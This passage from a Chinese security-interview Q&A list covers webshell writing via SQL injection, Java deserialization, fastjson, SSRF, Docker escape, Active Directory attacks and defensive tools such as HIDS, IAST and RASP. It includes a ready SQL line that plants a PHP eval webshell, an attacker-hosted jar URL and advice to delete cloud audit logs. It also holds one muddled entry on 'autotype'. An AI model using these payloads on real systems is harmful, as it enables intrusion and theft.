4. 对状态修改接口强制 POST/PUT，拒绝 GET。

</details>

## 96. SQL 注入怎么写马？
<details>
<summary>点击展开答案</summary>

Windows/MySQL 示例：
```sql
-- 写一句话木马到 Web 目录
SELECT '<?php @eval($_POST["x"]);?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'    
CHARACTER SET utf8;
```
要求：服务端具有 `FILE` 权限，路径可写；Linux 改为 `/var/www/html/`。

若被限制：
* 使用 **stacked queries** 写入 `powershell` 命令创建文件。
* MariaDB ≥10.2 可 `CREATE FUNCTION sys_eval` 执行 shell 完成落地。

</details>

## 97. OUTFILE 与 DUMPFILE 区别
<details>
<summary>点击展开答案</summary>

| 特性 | INTO OUTFILE | INTO DUMPFILE |
| --- | --- | --- |
| 适用语法 | `SELECT ... INTO OUTFILE` | `SELECT ... INTO DUMPFILE` |
| 换行 | 支持 `FIELDS TERMINATED BY`, `LINES TERMINATED BY`，可写多行 | 原样写入，不自动添加换行 |
| 编码 | 可指定 `CHARACTER SET` | 不可指定，按当前连接编码原样输出 |
| 典型用途 | 导出 CSV/写 WebShell（文本） | 导出二进制，如 jpg、so、dll |

因此写一句话推荐 OUTFILE，写 UDF/Evil DLL 推荐 DUMPFILE。

</details>

## 98. 代码如何生成 AST？
<details>
<summary>点击展开答案</summary>

以 Java 为例：
1. **词法分析**：使用 ANTLR/Javac Lexer 把源码 → Token 流。
2. **语法分析**：根据语言 Grammar 递归下降/LL/LR 生成 Parse Tree。
3. **构造 AST**：剔除注释/括号等无语义节点，构成抽象语法树对象；常见框架 javaparser、Eclipse JDT、Babel（JS）。
4. **遍历**：Visitor/Walker 模式修改或提取信息，再序列化回代码或中间表示。

</details>

## 99. 有没有不经过 IR 就生成 AST 的方法？缺陷是什么？
<details>
<summary>点击展开答案</summary>

可以**直接基于源码词法/语法规则构建 AST**，跳过 LLVM/GCC 等 **IR（中间表示）** 阶段，例如 javaparser、TypeScript Compiler API。优点：
* 构建快，占用内存少。
* 易于做格式化、重构、静态扫描等源级操作。

缺陷：
* 无类型推导、优化信息；跨文件调用、宏展开需额外解析。
* 失去编译器 SSA/CFG，难以做高级数据流分析、寄存器分配等编译优化。
* 与目标平台无关，无法做机器码层安全检查。

因此复杂编译器通常：源码 → AST → IR → 目标码；若直接停留在 AST，适合 IDE 辅助、安全扫描，而非高质量代码生成。

</details>

## 100. HIDS 的流程是什么？
<details>
<summary>点击展开答案</summary>

主机入侵检测系统（HIDS）核心流程：
1. **数据采集**：
   * 内核/驱动：syscall、eBPF、Kprobe；
   * 日志：Windows Event、Auditd、Syslog；
   * 文件完整性：inotify/FIM，对关键目录做哈希。
2. **预处理**：统一时区、字段映射、脱敏，写入缓冲队列。
3. **规则/模型匹配**：
   * 基于规则（Yara/ Sigma）：IOC、MD5、命令黑名单。
   * 基于行为：进程树、父子关系、网络异常；
   * ML/UEBA：统计基线，异常分值。
4. **告警与响应**：
   * 本地阻断（kill 进程/删除文件/iptables drop）。
   * 发送事件至 SIEM/SOAR，工单系统。
5. **溯源与取证**：保存原始日志、内存/磁盘镜像、关联 EDR timeline。
6. **策略更新**：SOC 调整规则、推送至 Agent，形成闭环。

常见开源实现：OSSEC、Wazuh、Falco（容器）、Sysmon + Winlogbeat。部署时需关注性能开销、日志安全与合规要求。

</details> 
## 101. IAST 和 RASP 的区别
<details>
<summary>点击展开答案</summary>

**IAST（Interactive Application Security Testing）** 用于测试阶段发现漏洞；**RASP（Runtime Application Self-Protection）** 用于生产环境实时防御。两者都在应用内部插桩，但：  
1. IAST 仅 **报告** 风险，RASP 可 **阻断/降级**。  
2. IAST 更注重 Source→Sink 数据流，RASP 只守危险 API。  
3. IAST 对性能要求相对宽松，RASP 必须毫秒级返回。  
4. 输出结果：IAST 给出代码行号 & PoC，RASP 产生安全日志/告警。  

</details>

## 102. 同类漏洞在 IAST 与 RASP 的埋点差异
<details>
<summary>点击展开答案</summary>

以 **SQL 注入** 为例：  
• IAST 会在 `HttpServletRequest` 入口和 `PreparedStatement.execute` 等 Sink 全链路植入 Taint 跟踪，恢复完整数据流。  
• RASP 通常只 Hook `Statement.execute`，在真正执行前检查语句并决定放行或阻断。  

IAST 埋点"深"，RASP 埋点"浅"，各自服务于检测与防护的不同目标。

</details>

## 103. 埋点深浅对检出率的影响
<details>
<summary>点击展开答案</summary>

* **深埋点**：覆盖路径多→漏报少，但性能损耗大、兼容性风险高。  
* **浅埋点**：性能友好→适合线上，但可能遗漏经框架封装或多步转换的隐蔽漏洞。  

因此检出率与埋点深度大致成正比，但存在边际收益递减，需要在"覆盖率 vs. 开销"间权衡。

</details>

## 104. Hook log4j Logger VS Hook JNDI Lookup
<details>
<summary>点击展开答案</summary>

| 方案 | 触达范围 | 是否可直接阻断 RCE | 获取上下文 | 版本兼容 |
|------|----------|--------------------|-----------|---------|
| **Logger Hook** (`Logger.log`) | 仅 log4j 引发的 JNDI | ✖（只能告警） | 日志级别/模板丰富 | 受 log4j 版本影响 |
| **JNDI Hook** (`InitialContext.lookup`) | 所有 JNDI 调用 | ✔（可抛异常阻断） | 上下文较少 | JNDI API 稳定 |

组合思路：在 Logger 侧做精准溯源，在 JNDI 侧做一锤定音的阻断。

</details>

## 105. 百度 IAST 主动式 vs 被动式
<details>
<summary>点击展开答案</summary>

* **被动式**：仅植入 Agent，被动分析业务流量，零侵扰但覆盖率取决于测试用例。  
* **主动式**：IAST 自带轻量 Fuzzer，主动发送带标签请求，再由 Agent 内部验证 Sink 是否触发，实现"黑盒探测 + 白盒验证"闭环，覆盖率更高但可能对子系统有额外流量压力。

</details>

## 106. 什么是符号执行
<details>
<summary>点击展开答案</summary>

把程序输入视作 **符号变量** 逐条解释，分支时记录约束，最终通过求解器枚举满足约束的具体输入，实现自动化路径覆盖与漏洞触发。

</details>

## 107. 约束求解如何进行
<details>
<summary>点击展开答案</summary>

1. 路径条件收集 → 2. 转换为 SMT-LIB → 3. 调用 Z3/CVC4 **SMT 求解器** 得到模型 → 4. 输出触发该路径的具体测试用例。  
实际实现采用 **增量求解** 与 **缓存** 以减小计算量。

</details>

## 108. Fuzz 可发现哪些漏洞
<details>
<summary>点击展开答案</summary>

缓冲区溢出、UAF、整数溢出、解析崩溃、OOM/DoS、状态机缺陷等"可被异常检测"的漏洞；对逻辑与权限绕过类问题效果有限。

</details>

## 109. 常见白盒扫描器及原理
<details>
<summary>点击展开答案</summary>

Fortify、Coverity、Checkmarx（商业）；CodeQL、Semgrep、Infer（开源）。底层技术涵盖 AST 语义分析、数据流/污点分析、抽象解释与符号执行。

</details>

## 110. Linux 权限 `777` 表示
<details>
<summary>点击展开答案</summary>

`rwxrwxrwx` —— 所有者、所属组、其他用户均拥有**读 (r)、写 (w)、执行 (x)** 权限。

</details>

## 111. SQL Server 除 `xp_cmdshell` 外的 RCE 手段
<details>
<summary>点击展开答案</summary>

1. **OLE Automation**：`sp_OACreate 'WScript.Shell',...` → `Run` 执行命令。  
2. **CLR Assembly**：启用 `clr enabled`, 上传 C# DLL，`Process.Start()`。  
3. **SQL Agent Job**：创建 CmdExec 类型 Job 并立即运行。  
4. **`xp_dirtree`+UNC**：诱导以 `NT AUTHORITY\SYSTEM` 身份连接恶意 SMB，再做 NTLM Relay。  
5. **注册表写入**：`xp_regwrite` 增加 `Run` 启动项后重启触发。  

</details>

## 112. Java 反序列化构链可利用的元素
<details>
<summary>点击展开答案</summary>

* **接口/机制**：`Serializable`, `Externalizable`, `InvocationHandler`, `Remote`。  
* **关键方法**：`readObject`, `readResolve`, `validateObject`, `writeReplace`。  
* **常用 Gadget 库**：`Commons-Collections`, `Spring Framework`, `Groovy`, `Hibernate`, `C3P0`, `BeanUtils`, `Javassist`。  
* **明星类**：`TemplatesImpl`, `AnnotationInvocationHandler`, `JdbcRowSetImpl`, `BadAttributeValueExpException`, `ProcessBuilder`, `PriorityQueue`, `TransformingComparator`。  

</details>

## 113. SSO 常见攻击
<details>
<summary>点击展开答案</summary>

### a. 绕过动态 Token
1. OAuth2 缺 `state` 校验 → CSRF 换票。  
2. 授权码重用窗口 + 网络重放。  
3. XSS/Referer 泄露 `access_token`。  
4. 利用开放重定向把 Token 发到攻击者域名。  

### b. 绕过双因素认证
1. **钓鱼代理**（evilginx / Muraena）实时转发并截获 Cookie。  
2. **SIM Swap** 获取短信验证码。  
3. MFA Fatigue：批量推送通知诱导用户误点允许。  
4. 获取已授权的长期 `refresh_token` 并离线续签。  

</details>

## 114. "不出网"环境的渗透思路
<details>
<summary>点击展开答案</summary>

1. **利用本地依赖**：如 JNDI 回环到本地类、H2 `INIT=...` 执行脚本。  
2. **文件写入执行**：上传 WAR / JSP、计划任务、DLL 注入等离线持久化。  
3. **DNS 单向通道**：多数隔离区仍放行 53 端口，可用 DNScat2 做 OOB。  
4. **SSRF 横向**：借助内部 HTTP 端点打内网服务。  
5. **物理/USB 投递**：BadUSB、自带 4G 模块实现隐蔽回连。  

</details>

## 115. 区块链基本原理
<details>
<summary>点击展开答案</summary>

分布式节点把交易打包成区块，通过哈希指针形成链；利用非对称签名验证身份，利用共识算法决定唯一合法账本，确保数据不可篡改、可追溯。

</details>

## 116. 主流共识算法
<details>
<summary>点击展开答案</summary>

PoW、PoS、DPoS、PBFT、Raft/BFT-Raft 等，分别服务于公链、联盟链与私链场景，对"安全性、性能、去中心化"三角进行不同权衡。

</details>

## 117. 工作量证明机制
<details>
<summary>点击展开答案</summary>

通过不断变更 Nonce 计算区块头双 SHA-256，直至哈希值低于网络难度目标；其他节点只需一次哈希即可验证，使作弊成本高昂且易验证。

</details>

## 118. 为何必须穷举哈希
<details>
<summary>点击展开答案</summary>

安全哈希具备 *单向性*，无法从输出倒推输入；要获得满足条件的哈希只能依靠暴力枚举，使资源投入与安全性直接挂钩。

</details>

## 119. 比特币难度调节
<details>
<summary>点击展开答案</summary>

每 2016 个区块（约两周）比较实际耗时与目标耗时 20160 分钟，按比例调整 Target 值，单次调整幅度限定在 4× / 0.25× 之间，保持平均 10 分钟出块节奏。

</details>

## 120. 通过 XXE 直接 RCE 的案例
<details>
<summary>点击展开答案</summary>

**Apache Solr < 7.1 的 CVE-2017-12629**：  
1. 利用 POST `/solr/<core>/dataimport` 上传含外部实体的 XML。  
2. 外部 DTD 强制加载 `jar:http://attacker/evil.jar!/payload.class`。  
3. Solr 在解析过程中通过 `URLClassLoader` 实例化恶意类，**静态块**中执行 `Runtime.getRuntime().exec()`，从而 RCE。  

同类还有 WebLogic WLS9 `workContext`、IBM WebSphere XXE 链等。

</details> 

# 121-139 题答案

## 121. Web 漏洞整体挖掘思路
<details><summary>点击展开答案</summary>

**整体流程**：
1. 信息收集（域名、子域、端口、指纹、技术栈）。  
2. 面向攻击面建模（认证、文件上传、存储、第三方组件、业务逻辑）。  
3. 弱点验证→漏洞链梳理→编写 PoC。  
4. 自动化脚本 & Fuzz → 扩大覆盖面。  
5. 复现产生的 Root Cause，提交报告或利用。

**关键工具**：Subfinder／Amass、Nuclei、Burp 扩展、自研 Fuzz、静态+动态混合分析。

**思考**：站在攻击者视角“最短路径到价值目标”。快速建立威胁建模→按资产优先级逐一突破→注意权限边界与影响面评估。

</details>

## 122. 在 HttpOnly Cookie 场景下如何利用 XSS
<details><summary>点击展开答案</summary>

1. **利用 token-based 方案**：若站点采用 JWT/Token 放在 `localStorage`，XSS 可直接窃取。  
2. **借助同站请求伪造**：虽然读取不到 Cookie，但仍可发起带 Cookie 的请求并读取响应中的敏感 JSON 对象（若 `Access-Control-Allow-Origin` 允许）。  
3. **UI Redressing**：利用 XSS 构造钓鱼页面，引导用户下载恶意文件或执行敏感操作。  
4. **Service Worker 劫持**：注册恶意 SW 拦截流量。  
5. **调用内部 API**：XSS 可直接调用后台接口执行管理操作（BFF/GraphQL等）。

核心点：HttpOnly 仅限制 JS 读取 Cookie，不影响带 Cookie 的请求及其它持久化数据。

</details>

## 123. 利用同域对象存储桶实施攻击
<details><summary>点击展开答案</summary>

场景：公司把 OSS/Qiniu/COS 绑定在 `static.example.com` 与主站同域。

1. **条件竞争上传**：找到可匿名上传或低权限上传接口→上传可执行脚本/HTML→通过同域访问绕过 CORS / SOP，直接获取用户 Cookie 或执行 JS。  
2. **缓存投毒**：利用 CDN 对同源缓存策略，将恶意文件的 `Content-Type` 设置为 `text/html`，造成脚本执行。  
3. **Signed URL 替换**：伪造带宽限制签名链接，引导后台服务器 SSRF 到受害对象存储桶。  
4. **Short Object Overwrite**：覆盖现有 JS 资源的部分字节，插入 malicious payload（8K bug）。

防御：最小权限 Bucket、隔离二级域名、强制下载头、CI 校验资源指纹。

</details>

## 124. 无外网环境下的 fastjson 利用方法
<details><summary>点击展开答案</summary>

1. **依赖本地类**：寻找应用自身 ClassPath 中的 `TemplatesImpl`、`JdbcRowSetImpl`、`ProcessBuilder` 等 Gadget。构造含命令的 JSON，不需要外网。  
2. **利用 `jndi:ldap://127.0.0.1`**：启动本地 LDAP 服务（或回环 0.0.0.0），注入内存马。  
3. **二次反序列化**：在第一级利用回显类执行反序列化，将字节码写入内存。  
4. **Blind gadget**：利用 `java.lang.AutoCloseable` 链触发 `Runtime.exec`，不需要回显。

核心：fastjson <=1.2.80 在 `autoType` 绕过后可加载任意类；无需出网，只要 Classpath 内存在可利用类。

</details>

## 125. 前后台联动导致的命令执行漏洞分析
<details><summary>点击展开答案</summary>

典型场景：前端上传 Excel→后台使用 `Runtime.getRuntime().exec("python xxx.py ...")` 处理。  

1. **参数注入**：通过文件名/字段注入 `& whoami` 等。  
2. **业务拼接命令**：`cmd /c "convert ` + userInput + `"`。  
3. **持久化**：在结果文件里写入 WebShell，后端再读取→落盘。  
4. **联动链路**：前端可控内容→后端系统命令→系统级权限。

修复：Whitelist、`ProcessBuilder` 数组参数、最小权限运行、审计 CI。

</details>

## 126. 云 VPC 渗透测试思路
<details><summary>点击展开答案</summary>

1. **入口**：弱口令/公开 Key/配置泄露→获取云账号或跳板机。  
2. **枚举资产**：调用云 API 列出 VPC、子网、SG、EIP、NAT。  
3. **东西向横移**：利用 SG 漏洞、VPC Peering、Transit Gateway 绕过边界。  
4. **云服务攻击**：STS 伪造、元数据服务 SSRF、存储桶劫持。  
5. **持久化**：IAM Role 绑定、事件触发函数（Lambda/FnF）注入。  
6. **防护绕过**：Disable CloudTrail / 修改 Config 规则。  
7. **痕迹清理**：删除 CloudTrail Event / S3 日志。

</details>

## 127. Java 反序列化利用链挖掘方法
<details><summary>点击展开答案</summary>

1. **依赖分析**：`mvn dependency:tree` 找到 `commons-collections`, `spring-core` 等潜在 Gadget。  
2. **入口点定位**：`readObject`/`JSON.parse`/`InflaterInputStream`。  
3. **调用图生成**：IDEA + `java-callgraph` 绘制 DataFlow，寻找可控 → `exec`。  
4. **自动化挖掘**：使用 `ysoserial-generator`, `GadgetInspector`；自编字节码污点追踪。  
5. **链拼接**：找到可控序列化字段→Chained Transformer → 命令执行。  
6. **Bypass**：类黑名单→新 Gadget / Memory Shell 插件。

</details>

## 128. 反射与动态代理在漏洞利用中的流程
<details><summary>点击展开答案</summary>

**反射**：`Class.forName()`→`newInstance()`→`Method.invoke()`；可用于绕过泛型检查、访问私有成员。  

**动态代理**：`InvocationHandler` 拦截→`Proxy.newProxyInstance` 生成字节码→方法调用时触发。  

利用：
1. 内存马注入：反射获取 `ServletContext` 注册 Servlet。  
2. JDK 动态代理 + `TemplatesImpl`：触发 `newTransformer()` 执行字节码。  
3. 模板引擎 SSTI 注入反射链，执行命令。  
4. 静态检测难度大，成为绕过关键。

</details>

## 129. Gadget 的作用与定位方法
<details><summary>点击展开答案</summary>

Gadget：在反序列化链中，从可控对象到危险调用的中间可执行代码片段。

**作用**：
- 连接可控数据与危险方法（最终接收器）。  
- 绕过安全过滤器（黑白名单）。  
- 提供跨版本共性利用。

**定位**：
1. 查找 `readObject`/`readResolve` 中执行方法。  
2. 利用 IDE 搜索 `InvokerTransformer`, `Method.invoke(`。  
3. 数据流分析 + Taint。  
4. 参考公开 Payload（ysoserial）回溯。  
5. 借助 `ASMifier` 解析字节码。

</details>

## 130. IAST 与 RASP 区别对比
<details><summary>点击展开答案</summary>

| 维度 | IAST | RASP |
| --- | --- | --- |
| 部署 | 测试环境/灰度 | 生产环境 Runtime |
| 数据来源 | 字节码插桩+代理获取请求/响应/污点 | 与 IAST 类似但侧重 Runtime 拦截 |
| 目标 | 发现漏洞 | 阻断攻击 |
| 性能 | 可接受 | 更高要求 (µs 级) |
| 响应 | 报告 | 阻断/打标签/告警 |

两者可组合：IAST 早期发现 + RASP 线上防御。

</details>

## 131. 内存马分类、加载与排查
<details><summary>点击展开答案</summary>

分类：
1. **Filter/Servlet 型**  
2. **Listener 型**  
3. **Agent/Instrument 型**  
4. **Framework Hook（Spring, Struts）**

加载方式：反射、字节码注入、`Unsafe`、`defineClass`、JVM Attach。

排查：
- 使用 `jcmd VM.classloaders`, `Arthas`, `jad` 查看匿名类。  
- 比对 `ServletContext` 注册表。  
- 检测内存中新增 `Filter` 名称、字节码校验和。  
- 对比 baseline 指纹。

</details>

## 132. fastjson 1.2.80 漏洞原理与修复
<details><summary>点击展开答案</summary>

漏洞：`autoType` Check 绕过 (CVE-2022-25845)。利用 `L` 开头数组类名长度 + `x` 特殊字符可骗过黑名单。

利用链：`com.sun.rowset.JdbcRowSetImpl` → `setDataSourceName` → JNDI → 反序列化或远程类加载。

修复：
1. 1.2.83+ 完全关闭默认 `autoType`。  
2. 增加 “白名单” 模式 `ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`。  
3. 服务器侧禁止反序列化外部输入。

</details>

## 133. 大模型在安全中的应用
<details><summary>点击展开答案</summary>

1. **漏洞归类与复现**：LLM 解析日志、重构 PoC。  
2. **代码审计**：对源码进行静态分析并给出修复建议。  
3. **社工邮件自动检测**：利用 GPT 识别钓鱼特征。  
4. **攻防对抗模拟**：LLM+强化学习生成变形 Payload，帮助蓝队训练。  
5. **威胁情报总结**：快速整理 IOC、TTP。  
6. **AI SOC 助手**：自然语言查询 SIEM，生成检测规则。

挑战：幻觉、上下文长度、隐私合规、计算成本。

</details>

## 134. PTH 与 RBCD 技术原理及利用
<details><summary>点击展开答案</summary>

**PTH**：利用 NTLM 哈希直接进行身份验证。无需明文密码；利用 `mimikatz sekurlsa::logonpasswords` 捕获哈希，然后 `psexec`, `wmiexec`。

**RBCD**：在 AD 中向目标计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 字段写入可控计算机账户 SID，再通过 S4U2Self & S4U2Proxy 获取票据，最终 `smbexec`。

先决条件：DCSync/WriteDACL 权限、目标机器操作系统支持。防御：最小权限、监控哈希使用、清理过期 Delegation。

</details>

## 135. Docker 逃逸常见方式
<details><summary>点击展开答案</summary>

1. **特权容器**：`--privileged` 授权后可挂载 `/proc`、加载模块。  
2. **挂载宿主目录**：`-v /:/host`，利用 chroot/chown。  
3. **cgroup 漏洞**：利用 runc、cgroup v1 竞争条件 CVE-2019-5736。  
4. **Kernel Exploit**：容器共享内核，Kernel 0-day → LPE。  
5. **逃逸到同主机其他容器**：Bridge-Spoofing, ARP Poison。  
6. **利用 Docker API**：未授权 TCP 2375 扩容特权容器。

防御：禁用特权、AppArmor/SELinux、Rootless、最小化内核面。

</details>

## 136. autotype 功能绕过技巧
<details><summary>点击展开答案</summary>

Autotype（自动完成功能）常出现在 WAF、IDS 正则检测：
1. **大小写混淆**：`SeLeCt` 绕过关键字。  
2. **Unicode/全角**：`ＳＥＬＥＣＴ`。  
3. **注释插入**：`SE/**/LECT`.  
4. **双写关键字**：`SSELECTELECT` → 被 Autotype 修正。  
5. **时间盲注**：跳过内容检测。  
6. **内联变异**：JS `String.fromCharCode()` 拼接，执行时恢复。

核心：利用自动纠正/模糊匹配特性，以出乎意料的方式绕过防御规则。

</details>

## 137. SSRF 在云环境中的深度利用
<details><summary>点击展开答案</summary>

1. **元数据服务**：`http://169.254.169.254` 获取凭证。  
2. **内部控制面板**：访问 `kubernetes.default.svc`，获取 Token。  
3. **横移其他 VPC**：利用 PrivateLink/Endpoint。  
4. **与缓存投毒结合**：SSRF → Redis → RCE。  
5. **对外回连**：通过云函数发起外网请求绕过出网限制。

</details>

## 138. 低权限到域管的横向移动
<details><summary>点击展开答案</summary>

1. **Kerberoasting**：请求高权限 SPN 票据→离线破解。  
2. **AS-REP Roasting**：针对 `Do not require pre-auth` 用户。  
3. **ACL Abuse**：GenericAll / GenericWrite → 添加恶意登录脚本。  
4. **PrinterBug + RBCD**：触发 NTLM relay 写入委派。  
5. **Group Policy Modification**：修改 GPP 策略下发恶意脚本。

</details>

## 139. OAuth2 漏洞利用与防御
<details><summary>点击展开答案</summary>

1. **Redirect URI Manipulation**：开放 `*.example.com` 通配，导致令牌泄露。  
2. **Implicit Flow XSS**：`access_token` 泄露在 URL Fragment。  
3. **PKCE 绕过**：弱 `code_verifier` 长度/字典。  
4. **Mix-Up Attack**：在多 IdP 场景下交换 `code`。  
5. **Refresh Token 泄露**：存在跨站脚本或存储不当。

防御：严格注册回调、使用 `state`/`nonce`、统一授权服务器、启用 PKCE + 授权码 Flow、最小化 token 生命周期。

</details>
